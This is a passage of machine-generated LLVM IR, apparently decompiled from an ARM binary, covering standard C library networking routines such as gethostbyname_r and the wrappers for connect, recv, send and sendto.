bb4:                                              ; preds = %entry, %bb
  %v5_15fd8 = phi i32 [ -1, %entry ], [ %v3_15fd0, %bb ]
  ret i32 %v5_15fd8

; uselistorder directives
  uselistorder label %bb4, { 1, 0 }
}

define i32 @__GI_gethostbyname(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  %v3_15fdc = load i32, i32* @r4, align 4
  store i32 %arg1, i32* @r4, align 4
  %v0_15fe8 = call i32 @__GI___h_errno_location()
  %v2_15fec = ptrtoint i32* %stack_var_-12 to i32
  %v0_15ff8 = load i32, i32* @r4, align 4
  %v7_16008 = call i32 @gethostbyname_r(i32 %v0_15ff8, i32* nonnull @global_var_317d4.1406, i32 ptrtoint (i32* @global_var_31608.1408 to i32), i32 460, i32 %v2_15fec, i32 %v0_15fe8)
  %v3_1600c = load i32, i32* %stack_var_-12, align 4
  store i32 %v3_15fdc, i32* @r4, align 4
  ret i32 %v3_1600c
}

define i32 @gethostbyname_r(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %tmp7 = call i32 @__decompiler_undefined_function_0()
  %stack_var_0 = alloca i32, align 4
  store i32 %arg5, i32* %stack_var_0, align 4
  %stack_var_-96 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %v6_16020 = load i32, i32* @r5, align 4
  %v9_16020 = load i32, i32* @r6, align 4
  %v12_16020 = load i32, i32* @r7, align 4
  %v15_16020 = load i32, i32* @r8, align 4
  %v18_16020 = load i32, i32* @sb, align 4
  %v21_16020 = load i32, i32* @sl, align 4
  %v24_16020 = load i32, i32* @fp, align 4
  store i32 %arg3, i32* @r7, align 4
  store i32 %arg5, i32* %r2.global-to-local, align 4
  %v0_16030 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_16030, i32* @fp, align 4
  %v2_16030 = icmp eq i32 %v0_16030, 0
  store i32 0, i32* @r6, align 4
  store i32 %tmp, i32* @sl, align 4
  store i32 %arg4, i32* @r4, align 4
  %v2_16040 = inttoptr i32 %arg5 to i32*
  store i32 0, i32* %v2_16040, align 4
  br i1 %v2_16030, label %bb, label %dec_label_pc_1604c

bb:                                               ; preds = %entry
  %v1_16044 = load i32, i32* %r0.global-to-local, align 4
  %v2_16044 = add i32 %v1_16044, 22
  store i32 %v2_16044, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_16370

dec_label_pc_1604c:                               ; preds = %entry
  %v0_1604c = call i32 @__errno_location()
  store i32 %v0_1604c, i32* %r0.global-to-local, align 4
  %v3_16050 = load i32, i32* %stack_var_0, align 4
  store i32 %v3_16050, i32* %ip.global-to-local, align 4
  %v1_16054 = inttoptr i32 %v0_1604c to i32*
  %v2_16054 = load i32, i32* %v1_16054, align 4
  store i32 %v2_16054, i32* @r8, align 4
  %v0_16058 = load i32, i32* @r6, align 4
  store i32 %v0_16058, i32* %v1_16054, align 4
  %v0_1605c = load i32, i32* %ip.global-to-local, align 4
  store i32 %arg6, i32* %ip.global-to-local, align 4
  store i32 %v0_1604c, i32* @r5, align 4
  %v0_1606c = load i32, i32* @fp, align 4
  store i32 %v0_1606c, i32* %r0.global-to-local, align 4
  %v0_16070 = load i32, i32* @sl, align 4
  store i32 %v0_16070, i32* %r2.global-to-local, align 4
  %v0_16074 = load i32, i32* @r7, align 4
  store i32 %v0_16074, i32* %r3.global-to-local, align 4
  %v0_16078 = load i32, i32* @r4, align 4
  %v7_16080 = call i32 @__get_hosts_byname_r(i32 %v0_1606c, i32 2, i32 %v0_16070, i32 %v0_16074, i32 %v0_16078, i32 %v0_1605c, i32 %arg6)
  store i32 %v7_16080, i32* %r0.global-to-local, align 4
  %v2_16084 = icmp eq i32 %v7_16080, 0
  br i1 %v2_16084, label %dec_label_pc_16370, label %dec_label_pc_1608c

dec_label_pc_1608c:                               ; preds = %dec_label_pc_1604c
  store i32 %arg6, i32* %r2.global-to-local, align 4
  %v1_16090 = inttoptr i32 %arg6 to i32*
  %v2_16090 = load i32, i32* %v1_16090, align 4
  store i32 %v2_16090, i32* %r3.global-to-local, align 4
  %v7_16094 = icmp eq i32 %v2_16090, 1
  br i1 %v7_16094, label %dec_label_pc_160b8, label %dec_label_pc_1609c

dec_label_pc_1609c:                               ; preds = %dec_label_pc_1608c
  %v7_1609c = icmp eq i32 %v2_16090, 4
  br i1 %v7_1609c, label %dec_label_pc_160b8, label %dec_label_pc_160a4

dec_label_pc_160a4:                               ; preds = %dec_label_pc_1609c
  %v3_160a4 = icmp eq i32 %v2_16090, -1
  br i1 %v3_160a4, label %dec_label_pc_160ac, label %dec_label_pc_16370

dec_label_pc_160ac:                               ; preds = %dec_label_pc_160a4
  %v0_160ac = load i32, i32* @r5, align 4
  %v1_160ac = inttoptr i32 %v0_160ac to i32*
  %v2_160ac = load i32, i32* %v1_160ac, align 4
  store i32 %v2_160ac, i32* %r3.global-to-local, align 4
  %v7_160b0 = icmp eq i32 %v2_160ac, 2
  br i1 %v7_160b0, label %dec_label_pc_160b8, label %dec_label_pc_16370

dec_label_pc_160b8:                               ; preds = %dec_label_pc_160ac, %dec_label_pc_1609c, %dec_label_pc_1608c
  %v0_160b8 = load i32, i32* @r7, align 4
  %v1_160b8 = sub i32 0, %v0_160b8
  %v1_160bc = urem i32 %v1_160b8, 4
  store i32 %v1_160bc, i32* %r3.global-to-local, align 4
  %v2_160bc = icmp eq i32 %v1_160bc, 0
  %v0_160c0 = load i32, i32* @r8, align 4
  %v1_160c0 = load i32, i32* @r5, align 4
  %v2_160c0 = inttoptr i32 %v1_160c0 to i32*
  store i32 %v0_160c0, i32* %v2_160c0, align 4
  %v0_160e0.pre = load i32, i32* @r4, align 4
  br i1 %v2_160bc, label %dec_label_pc_160d8, label %dec_label_pc_160c8

dec_label_pc_160c8:                               ; preds = %dec_label_pc_160b8
  %v1_160c8 = load i32, i32* %r3.global-to-local, align 4
  %v2_160c8 = sub i32 %v0_160e0.pre, %v1_160c8
  %v3_160c8 = icmp ult i32 %v0_160e0.pre, %v1_160c8
  br i1 %v3_160c8, label %dec_label_pc_1636c, label %dec_label_pc_160d0

dec_label_pc_160d0:                               ; preds = %dec_label_pc_160c8
  store i32 %v2_160c8, i32* @r4, align 4
  %v0_160d4 = load i32, i32* @r7, align 4
  %v2_160d4 = add i32 %v0_160d4, %v1_160c8
  store i32 %v2_160d4, i32* @r7, align 4
  br label %dec_label_pc_160d8

dec_label_pc_160d8:                               ; preds = %dec_label_pc_160b8, %dec_label_pc_160d0
  %v0_160e0 = phi i32 [ %v2_160c8, %dec_label_pc_160d0 ], [ %v0_160e0.pre, %dec_label_pc_160b8 ]
  store i32 %arg6, i32* %r3.global-to-local, align 4
  store i32 -1, i32* %ip.global-to-local, align 4
  store i32 -1, i32* %v1_16090, align 4
  %tmp31 = icmp ult i32 %v0_160e0, 4
  br i1 %tmp31, label %dec_label_pc_1636c, label %dec_label_pc_160ec

dec_label_pc_160ec:                               ; preds = %dec_label_pc_160d8
  %v0_160ec = load i32, i32* @r4, align 4
  %v1_160ec = add i32 %v0_160ec, -4
  store i32 %v1_160ec, i32* %r3.global-to-local, align 4
  %tmp32 = icmp ult i32 %v1_160ec, 8
  br i1 %tmp32, label %dec_label_pc_1636c, label %dec_label_pc_160f8

dec_label_pc_160f8:                               ; preds = %dec_label_pc_160ec
  %v1_160f8 = add i32 %v0_160ec, -12
  store i32 %v1_160f8, i32* %r3.global-to-local, align 4
  %v0_160fc = load i32, i32* @r7, align 4
  %v1_160fc = add i32 %v0_160fc, 4
  store i32 %v1_160fc, i32* @sb, align 4
  store i32 0, i32* @r5, align 4
  %v3_16108 = inttoptr i32 %v1_160fc to i32*
  store i32 %v0_160fc, i32* %v3_16108, align 4
  %v0_1610c = load i32, i32* @r5, align 4
  %v1_1610c = load i32, i32* @sb, align 4
  %v2_1610c = add i32 %v1_1610c, 4
  %v3_1610c = inttoptr i32 %v2_1610c to i32*
  store i32 %v0_1610c, i32* %v3_1610c, align 4
  %tmp33 = icmp ult i32 %v1_160f8, 32
  br i1 %tmp33, label %dec_label_pc_1636c, label %dec_label_pc_16114

dec_label_pc_16114:                               ; preds = %dec_label_pc_160f8
  %v0_16114 = load i32, i32* @r4, align 4
  %v1_16114 = add i32 %v0_16114, -44
  store i32 %v1_16114, i32* @r8, align 4
  %tmp34 = icmp ult i32 %v1_16114, 256
  br i1 %tmp34, label %dec_label_pc_1636c, label %dec_label_pc_16120

dec_label_pc_16120:                               ; preds = %dec_label_pc_16114
  %v0_16120 = load i32, i32* @r7, align 4
  %v1_16120 = add i32 %v0_16120, 44
  store i32 %v1_16120, i32* @r6, align 4
  %v1_16124 = add i32 %v0_16120, 12
  store i32 %v1_16124, i32* %r3.global-to-local, align 4
  %v0_16128 = load i32, i32* @fp, align 4
  store i32 %v0_16128, i32* @r1, align 4
  store i32 %v1_16114, i32* %r2.global-to-local, align 4
  store i32 %v1_16120, i32* %r0.global-to-local, align 4
  %v3_16138 = call i32 @strncpy(i32 %v1_16120, i32 %v0_16128, i32 %v1_16114)
  store i32 %v1_16124, i32* %ip.global-to-local, align 4
  %v0_16140 = load i32, i32* @r6, align 4
  %v1_16140 = load i32, i32* @r7, align 4
  %v2_16140 = add i32 %v1_16140, 12
  %v3_16140 = inttoptr i32 %v2_16140 to i32*
  store i32 %v0_16140, i32* %v3_16140, align 4
  %v0_16144 = load i32, i32* @fp, align 4
  store i32 %v0_16144, i32* %r0.global-to-local, align 4
  %v0_16148 = load i32, i32* @r5, align 4
  %v1_16148 = load i32, i32* %ip.global-to-local, align 4
  %v2_16148 = add i32 %v1_16148, 4
  %v3_16148 = inttoptr i32 %v2_16148 to i32*
  store i32 %v0_16148, i32* %v3_16148, align 4
  %v0_1614c = load i32, i32* @r7, align 4
  %v2_16150 = inttoptr i32 %v0_16144 to i8*
  %v3_16150 = call i32 @inet_aton(i8* %v2_16150, i32 %v0_1614c)
  store i32 %v3_16150, i32* %r0.global-to-local, align 4
  %v2_16154 = icmp eq i32 %v3_16150, 0
  br i1 %v2_16154, label %dec_label_pc_16198, label %dec_label_pc_16160

dec_label_pc_16160:                               ; preds = %dec_label_pc_16120
  store i32 2, i32* %r3.global-to-local, align 4
  %v1_16164 = load i32, i32* @sl, align 4
  %v2_16164 = add i32 %v1_16164, 8
  %v3_16164 = inttoptr i32 %v2_16164 to i32*
  store i32 2, i32* %v3_16164, align 4
  %v0_16168 = load i32, i32* %r3.global-to-local, align 4
  %v2_16168 = mul i32 %v0_16168, 2
  %v1_1616c = load i32, i32* @sl, align 4
  %v2_1616c = add i32 %v1_1616c, 12
  %v3_1616c = inttoptr i32 %v2_1616c to i32*
  store i32 %v2_16168, i32* %v3_1616c, align 4
  %v3_16170 = load i32, i32* %stack_var_0, align 4
  store i32 %v3_16170, i32* %r2.global-to-local, align 4
  store i32 %v1_16124, i32* %r3.global-to-local, align 4
  store i32 %arg6, i32* %ip.global-to-local, align 4
  %v0_1617c = load i32, i32* @r5, align 4
  store i32 %v0_1617c, i32* %r0.global-to-local, align 4
  %v0_16180 = load i32, i32* @sl, align 4
  %v2_16180 = inttoptr i32 %v3_16170 to i32*
  store i32 %v0_16180, i32* %v2_16180, align 4
  %v0_16184 = load i32, i32* @r6, align 4
  %v1_16184 = load i32, i32* @sl, align 4
  %v2_16184 = inttoptr i32 %v1_16184 to i32*
  store i32 %v0_16184, i32* %v2_16184, align 4
  %v0_16188 = load i32, i32* @sb, align 4
  %v1_16188 = load i32, i32* @sl, align 4
  %v2_16188 = add i32 %v1_16188, 16
  %v3_16188 = inttoptr i32 %v2_16188 to i32*
  store i32 %v0_16188, i32* %v3_16188, align 4
  %v0_1618c = load i32, i32* %r3.global-to-local, align 4
  %v1_1618c = load i32, i32* @sl, align 4
  %v2_1618c = add i32 %v1_1618c, 4
  %v3_1618c = inttoptr i32 %v2_1618c to i32*
  store i32 %v0_1618c, i32* %v3_1618c, align 4
  %v0_16190 = load i32, i32* @r5, align 4
  %v1_16190 = load i32, i32* %ip.global-to-local, align 4
  %v2_16190 = inttoptr i32 %v1_16190 to i32*
  store i32 %v0_16190, i32* %v2_16190, align 4
  br label %dec_label_pc_16370

dec_label_pc_16198:                               ; preds = %dec_label_pc_16120
  %v2_16198 = ptrtoint i32* %stack_var_-56 to i32
  store i32 %v2_16198, i32* @r5, align 4
  %v1_1619c = call i32 @__open_nameservers(i32 0)
  store i32 ptrtoint (i32* @global_var_2b598.1410 to i32), i32* %r2.global-to-local, align 4
  store i32 %v2_16198, i32* @r0, align 4
  store i32 95968, i32* %r3.global-to-local, align 4
  %v1_161b4 = call i32 @__pthread_return_void()
  store i32 ptrtoint (i8* @global_var_176d8.1331 to i32), i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_2b598.1410 to i32), i32* %r0.global-to-local, align 4
  %v1_161c4 = call i32 @__pthread_return_0()
  store i32 %v2_16198, i32* @r0, align 4
  %v2_161d0 = load i32, i32* @global_var_3190c.1415, align 4
  store i32 %v2_161d0, i32* @r4, align 4
  store i32 95968, i32* %r3.global-to-local, align 4
  %v1_161e0 = call i32 @__pthread_return_void()
  %v2_161ec = ptrtoint i32* %stack_var_-40 to i32
  store i32 ptrtoint (i32* @global_var_31900.1418 to i32), i32* %r3.global-to-local, align 4
  %v0_161f8 = load i32, i32* @fp, align 4
  store i32 %v0_161f8, i32* %r0.global-to-local, align 4
  %v2_161fc = ptrtoint i32* %stack_var_-96 to i32
  store i32 %v2_161fc, i32* %ip.global-to-local, align 4
  %v0_16200 = load i32, i32* @r4, align 4
  store i32 %v0_16200, i32* %r2.global-to-local, align 4
  %v6_16214 = inttoptr i32 %v0_161f8 to i8*
  %v7_16214 = call i32 @__dns_lookup(i8* %v6_16214, i32 1, i32 %v0_16200, i32 ptrtoint (i32* @global_var_31900.1418 to i32), i32 %v2_161ec, i32 %v2_161fc)
  store i32 %v7_16214, i32* %r0.global-to-local, align 4
  %v1_16218 = icmp slt i32 %v7_16214, 0
  br i1 %v1_16218, label %.dec_label_pc_16344_crit_edge, label %dec_label_pc_16228

.dec_label_pc_16344_crit_edge:                    ; preds = %dec_label_pc_16198
  store i32 2, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_16344

dec_label_pc_16228:                               ; preds = %dec_label_pc_16198
  store i32 256, i32* %r3.global-to-local, align 4
  %v1_1623c = load i32, i32* @r8, align 4
  %tmp35 = icmp ugt i32 %v1_1623c, 255
  br i1 %tmp35, label %dec_label_pc_162d8, label %dec_label_pc_16244

dec_label_pc_16244:                               ; preds = %dec_label_pc_16228
  %v3_16244 = load i32, i32* %stack_var_-96, align 4
  store i32 %v3_16244, i32* %r0.global-to-local, align 4
  %v1_16248 = call i32 @free(i32 %v3_16244)
  %v3_1624c = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_1624c, i32* %r0.global-to-local, align 4
  %v1_16250 = call i32 @free(i32 %v3_1624c)
  store i32 %arg6, i32* %r3.global-to-local, align 4
  store i32 -1, i32* %ip.global-to-local, align 4
  store i32 34, i32* %r0.global-to-local, align 4
  store i32 -1, i32* %v1_16090, align 4
  br label %dec_label_pc_16370

dec_label_pc_162d8:                               ; preds = %dec_label_pc_16228
  %v3_162dc.pre = load i32, i32* %stack_var_-96, align 4
  %v0_162e0.pre = load i32, i32* @r6, align 4
  store i32 %v1_1623c, i32* %r2.global-to-local, align 4
  store i32 %v3_162dc.pre, i32* @r1, align 4
  store i32 %v0_162e0.pre, i32* %r0.global-to-local, align 4
  %v3_162e4 = call i32 @strncpy(i32 %v0_162e0.pre, i32 %v3_162dc.pre, i32 %v1_1623c)
  %v3_162e8 = load i32, i32* %stack_var_-96, align 4
  store i32 %v3_162e8, i32* %r0.global-to-local, align 4
  %v1_162ec = call i32 @free(i32 %v3_162e8)
  store i32 %v1_162ec, i32* %r0.global-to-local, align 4
  store i32 %tmp7, i32* %r3.global-to-local, align 4
  %v7_162f4 = icmp eq i32 %tmp7, 1
  br i1 %v7_162f4, label %dec_label_pc_162fc, label %dec_label_pc_16350

dec_label_pc_162fc:                               ; preds = %dec_label_pc_162d8
  store i32 4, i32* @r2, align 4
  %v0_16304 = load i32, i32* @r7, align 4
  store i32 %v0_16304, i32* @r0, align 4
  %v0_16308 = call i32 @memcpy()
  store i32 2, i32* %r3.global-to-local, align 4
  store i32 %v1_16124, i32* %r2.global-to-local, align 4
  %v1_16314 = load i32, i32* @sl, align 4
  %v2_16314 = add i32 %v1_16314, 8
  %v3_16314 = inttoptr i32 %v2_16314 to i32*
  store i32 2, i32* %v3_16314, align 4
  %v0_16318 = load i32, i32* %r3.global-to-local, align 4
  %v2_16318 = mul i32 %v0_16318, 2
  store i32 %v2_16318, i32* %r3.global-to-local, align 4
  %v1_1631c = load i32, i32* @sl, align 4
  %v2_1631c = add i32 %v1_1631c, 12
  %v3_1631c = inttoptr i32 %v2_1631c to i32*
  store i32 %v2_16318, i32* %v3_1631c, align 4
  %v3_16320 = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_16320, i32* %r0.global-to-local, align 4
  %v0_16324 = load i32, i32* @r6, align 4
  %v1_16324 = load i32, i32* @sl, align 4
  %v2_16324 = inttoptr i32 %v1_16324 to i32*
  store i32 %v0_16324, i32* %v2_16324, align 4
  %v0_16328 = load i32, i32* @sb, align 4
  %v1_16328 = load i32, i32* @sl, align 4
  %v2_16328 = add i32 %v1_16328, 16
  %v3_16328 = inttoptr i32 %v2_16328 to i32*
  store i32 %v0_16328, i32* %v3_16328, align 4
  %v0_1632c = load i32, i32* %r2.global-to-local, align 4
  %v1_1632c = load i32, i32* @sl, align 4
  %v2_1632c = add i32 %v1_1632c, 4
  %v3_1632c = inttoptr i32 %v2_1632c to i32*
  store i32 %v0_1632c, i32* %v3_1632c, align 4
  %v1_16330 = call i32 @free(i32 %v3_16320)
  %v3_16334 = load i32, i32* %stack_var_0, align 4
  store i32 %v3_16334, i32* %ip.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_1633c = load i32, i32* @sl, align 4
  %v2_1633c = inttoptr i32 %v3_16334 to i32*
  store i32 %v0_1633c, i32* %v2_1633c, align 4
  %v0_16340 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v0_16340, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_16344

dec_label_pc_16344:                               ; preds = %.dec_label_pc_16344_crit_edge, %dec_label_pc_162fc
  %v0_16348 = phi i32 [ 1, %.dec_label_pc_16344_crit_edge ], [ %v0_16340, %dec_label_pc_162fc ]
  store i32 %arg6, i32* %r2.global-to-local, align 4
  store i32 %v0_16348, i32* %v1_16090, align 4
  br label %dec_label_pc_16370

dec_label_pc_16350:                               ; preds = %dec_label_pc_162d8
  %v3_16350 = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_16350, i32* %r0.global-to-local, align 4
  %v1_16354 = call i32 @free(i32 %v3_16350)
  store i32 %arg6, i32* %ip.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  store i32 1, i32* %v1_16090, align 4
  br label %dec_label_pc_16370

dec_label_pc_1636c:                               ; preds = %dec_label_pc_160c8, %dec_label_pc_16114, %dec_label_pc_160f8, %dec_label_pc_160ec, %dec_label_pc_160d8
  store i32 34, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_16370

dec_label_pc_16370:                               ; preds = %bb, %dec_label_pc_160ac, %dec_label_pc_160a4, %dec_label_pc_1604c, %dec_label_pc_16350, %dec_label_pc_16344, %dec_label_pc_16244, %dec_label_pc_16160, %dec_label_pc_1636c
  store i32 %v6_16020, i32* @r5, align 4
  store i32 %v9_16020, i32* @r6, align 4
  store i32 %v12_16020, i32* @r7, align 4
  store i32 %v15_16020, i32* @r8, align 4
  store i32 %v18_16020, i32* @sb, align 4
  store i32 %v21_16020, i32* @sl, align 4
  store i32 %v24_16020, i32* @fp, align 4
  %v29_16374 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v29_16374

; uselistorder directives
  uselistorder i32 %v2_16318, { 1, 0 }
  uselistorder i32 %v1_1623c, { 1, 2, 0 }
  uselistorder i32 %v1_16124, { 1, 2, 0, 3 }
  uselistorder i32 %v1_16120, { 1, 0, 2 }
  uselistorder i32 %v1_16114, { 2, 1, 0, 3 }
  uselistorder i32 %v0_160e0.pre, { 0, 2, 1 }
  uselistorder i32 %v1_160bc, { 1, 0 }
  uselistorder i32* %v1_16090, { 2, 3, 1, 0, 4 }
  uselistorder i32 %v0_16030, { 1, 0 }
  uselistorder i32* %stack_var_-96, { 1, 0, 2, 3 }
  uselistorder i32* %stack_var_0, { 1, 2, 3, 0 }
  uselistorder i32 %tmp7, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 0 }
  uselistorder i32* %r0.global-to-local, { 24, 3, 4, 5, 6, 7, 9, 8, 10, 11, 12, 13, 14, 17, 15, 16, 18, 20, 19, 21, 23, 22, 26, 25, 0, 1, 2 }
  uselistorder i32 %arg6, { 8, 7, 6, 5, 4, 3, 2, 0, 1 }
  uselistorder label %dec_label_pc_16370, { 8, 4, 5, 6, 7, 1, 2, 3, 0 }
  uselistorder label %dec_label_pc_1636c, { 1, 2, 3, 4, 0 }
  uselistorder label %dec_label_pc_16344, { 1, 0 }
  uselistorder label %dec_label_pc_160d8, { 1, 0 }
}

define i32 @__libc_connect(i32 %arg1, %sockaddr* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_16394 = load i32, i32* @r4, align 4
  store i32 %v3_16394, i32* %stack_var_-8, align 4
  %v5_16398 = call i32 @connect(i32 %arg1, %sockaddr* %arg2, i32 %arg3)
  store i32 %v5_16398, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v5_16398, -4095
  br i1 %tmp, label %dec_label_pc_163b8, label %dec_label_pc_163a8

dec_label_pc_163a8:                               ; preds = %entry
  %v0_163a8 = call i32 @__errno_location()
  %v0_163ac = load i32, i32* %r4.global-to-local, align 4
  %v1_163ac = sub i32 0, %v0_163ac
  %v2_163b0 = inttoptr i32 %v0_163a8 to i32*
  store i32 %v1_163ac, i32* %v2_163b0, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_163b8

dec_label_pc_163b8:                               ; preds = %entry, %dec_label_pc_163a8
  %v0_163b8 = phi i32 [ %v5_16398, %entry ], [ -1, %dec_label_pc_163a8 ]
  %v2_163bc = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_163bc, i32* @r4, align 4
  ret i32 %v0_163b8

; uselistorder directives
  uselistorder i32 %v5_16398, { 1, 0, 2 }
  uselistorder label %dec_label_pc_163b8, { 1, 0 }
}

define i32 @__GI_getsockname(i32 %arg1, %sockaddr* %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_163c0 = load i32, i32* @r4, align 4
  store i32 %v3_163c0, i32* %stack_var_-8, align 4
  %v5_163c4 = inttoptr i32 %arg3 to i32*
  %v6_163c4 = call i32 @getsockname(i32 %arg1, %sockaddr* %arg2, i32* %v5_163c4)
  store i32 %v6_163c4, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v6_163c4, -4095
  br i1 %tmp, label %dec_label_pc_163e4, label %dec_label_pc_163d4

dec_label_pc_163d4:                               ; preds = %entry
  %v0_163d4 = call i32 @__errno_location()
  %v0_163d8 = load i32, i32* %r4.global-to-local, align 4
  %v1_163d8 = sub i32 0, %v0_163d8
  %v2_163dc = inttoptr i32 %v0_163d4 to i32*
  store i32 %v1_163d8, i32* %v2_163dc, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_163e4

dec_label_pc_163e4:                               ; preds = %entry, %dec_label_pc_163d4
  %v0_163e4 = phi i32 [ %v6_163c4, %entry ], [ -1, %dec_label_pc_163d4 ]
  %v2_163e8 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_163e8, i32* @r4, align 4
  ret i32 %v0_163e4

; uselistorder directives
  uselistorder i32 %v6_163c4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_163e4, { 1, 0 }
}

define i32 @getsockopt() local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_163ec = load i32, i32* @r4, align 4
  store i32 %v3_163ec, i32* %stack_var_-8, align 4
  %v0_163f4 = call i32 @getsockopt()
  store i32 %v0_163f4, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v0_163f4, -4095
  br i1 %tmp, label %dec_label_pc_16414, label %dec_label_pc_16404

dec_label_pc_16404:                               ; preds = %entry
  %v0_16404 = call i32 @__errno_location()
  %v0_16408 = load i32, i32* %r4.global-to-local, align 4
  %v1_16408 = sub i32 0, %v0_16408
  %v2_1640c = inttoptr i32 %v0_16404 to i32*
  store i32 %v1_16408, i32* %v2_1640c, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_16414

dec_label_pc_16414:                               ; preds = %entry, %dec_label_pc_16404
  %v0_16414 = phi i32 [ %v0_163f4, %entry ], [ -1, %dec_label_pc_16404 ]
  %v2_16418 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_16418, i32* @r4, align 4
  ret i32 %v0_16414

; uselistorder directives
  uselistorder i32 %v0_163f4, { 1, 0, 2 }
  uselistorder i32 ()* @getsockopt, { 4, 2, 1, 3, 0 }
  uselistorder label %dec_label_pc_16414, { 1, 0 }
}

define i32 @__libc_recv(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_1641c = load i32, i32* @r4, align 4
  store i32 %v3_1641c, i32* %stack_var_-8, align 4
  %v5_16420 = call i32 @recv(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4)
  store i32 %v5_16420, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v5_16420, -4095
  br i1 %tmp, label %dec_label_pc_16440, label %dec_label_pc_16430

dec_label_pc_16430:                               ; preds = %entry
  %v0_16430 = call i32 @__errno_location()
  %v0_16434 = load i32, i32* %r4.global-to-local, align 4
  %v1_16434 = sub i32 0, %v0_16434
  %v2_16438 = inttoptr i32 %v0_16430 to i32*
  store i32 %v1_16434, i32* %v2_16438, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_16440

dec_label_pc_16440:                               ; preds = %entry, %dec_label_pc_16430
  %v0_16440 = phi i32 [ %v5_16420, %entry ], [ -1, %dec_label_pc_16430 ]
  %v2_16444 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_16444, i32* @r4, align 4
  ret i32 %v0_16440

; uselistorder directives
  uselistorder i32 %v5_16420, { 1, 0, 2 }
  uselistorder label %dec_label_pc_16440, { 1, 0 }
}

define i32 @__libc_send(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_16448 = load i32, i32* @r4, align 4
  store i32 %v3_16448, i32* %stack_var_-8, align 4
  %v5_1644c = call i32 @send(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4)
  store i32 %v5_1644c, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v5_1644c, -4095
  br i1 %tmp, label %dec_label_pc_1646c, label %dec_label_pc_1645c

dec_label_pc_1645c:                               ; preds = %entry
  %v0_1645c = call i32 @__errno_location()
  %v0_16460 = load i32, i32* %r4.global-to-local, align 4
  %v1_16460 = sub i32 0, %v0_16460
  %v2_16464 = inttoptr i32 %v0_1645c to i32*
  store i32 %v1_16460, i32* %v2_16464, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_1646c

dec_label_pc_1646c:                               ; preds = %entry, %dec_label_pc_1645c
  %v0_1646c = phi i32 [ %v5_1644c, %entry ], [ -1, %dec_label_pc_1645c ]
  %v2_16470 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_16470, i32* @r4, align 4
  ret i32 %v0_1646c

; uselistorder directives
  uselistorder i32 %v5_1644c, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1646c, { 1, 0 }
}

define i32 @__libc_sendto(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_16474 = load i32, i32* @r4, align 4
  store i32 %v3_16474, i32* %stack_var_-12, align 4
  store i32 %arg5, i32* %r4.global-to-local, align 4
  %v5_16480 = call i32 @sendto(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4, %sockaddr* null, i32 0)
